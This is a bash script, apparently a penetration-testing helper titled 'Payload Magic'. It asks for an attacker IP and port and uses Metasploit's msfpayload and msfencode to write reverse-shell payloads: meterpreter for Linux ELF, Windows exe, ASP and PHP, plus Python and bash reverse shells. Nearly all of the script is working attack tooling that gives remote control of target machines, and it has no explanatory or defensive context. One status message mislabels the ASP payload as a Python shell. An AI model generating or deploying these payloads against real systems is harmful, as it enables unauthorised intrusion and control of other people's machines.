#!/bin/bash
#Author nerbies 

ENCODINGTIMES=5
echo " ____   ____  __ __  _       ___    ____  ___   ";
echo "|    \ /    ||  |  || |     /   \  /    ||   \  ";
echo "|  o  )  o  ||  |  || |    |     ||  o  ||    \ ";
echo "|   _/|     ||  ~  || |___ |  O  ||     ||  D  |";
echo "|  |  |  _  ||___, ||     ||     ||  _  ||     |";
echo "|  |  |  |  ||     ||     ||     ||  |  ||     |";
echo "|__|  |__|__||____/ |_____| \___/ |__|__||_____|";
echo "                                                ";
echo " ███▄ ▄███▓ ▄▄▄        ▄████  ██▓ ▄████▄  ";
echo "▓██▒▀█▀ ██▒▒████▄     ██▒ ▀█▒▓██▒▒██▀ ▀█  ";
echo "▓██    ▓██░▒██  ▀█▄  ▒██░▄▄▄░▒██▒▒▓█    ▄ ";
echo "▒██    ▒██ ░██▄▄▄▄██ ░▓█  ██▓░██░▒▓▓▄ ▄██▒";
echo "▒██▒   ░██▒ ▓█   ▓██▒░▒▓███▀▒░██░▒ ▓███▀ ░";
echo "░ ▒░   ░  ░ ▒▒   ▓▒█░ ░▒   ▒ ░▓  ░ ░▒ ▒  ░";
echo "░  ░      ░  ▒   ▒▒ ░  ░   ░  ▒ ░  ░  ▒   ";
echo "░      ░     ░   ▒   ░ ░   ░  ▒ ░░        ";
echo "       ░         ░  ░      ░  ░  ░ ░      ";
echo "                                 ░        ";

echo -e -n "\n Your IP: "
read IP
echo -e -n "\n Which port number are we going to use: "
read PORTNUM

echo -e "\n Generating Payloads.... \n"
echo -e "\n this can take some time. Please wait...\n"

msfpayload linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORTNUM R | msfencode -t elf -o shell
echo -e "\n[*] Done generating linux meterpreter shell - 'shell' \n"

msfpayload cmd/unix/reverse_python LHOST=$IP LPORT=$PORTNUM R > shell.py
echo -e "\n[*] Done generating reverse python shell - 'shell.py' \n"

msfpayload windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORTNUM R | msfencode -t asp -o shell.asp
echo -e "\n[*] Done generating meterpreter reverse python shell - 'shell.asp' \n"

msfpayload cmd/unix/reverse_bash LHOST=$IP LPORT=$PORTNUM R > shell.sh
echo -e "\n[*] Done generating reverse bash shell - 'shell.sh' \n"

msfpayload php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORTNUM R > shell.php
echo -e "\n[*] Done generating reverse meterpreter php shell - 'shell.php' \n"

msfpayload windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORTNUM X >shell.exe
echo -e "\n[*] Done generating reverse meterpreter windows binary shell - 'shell.exe' \n"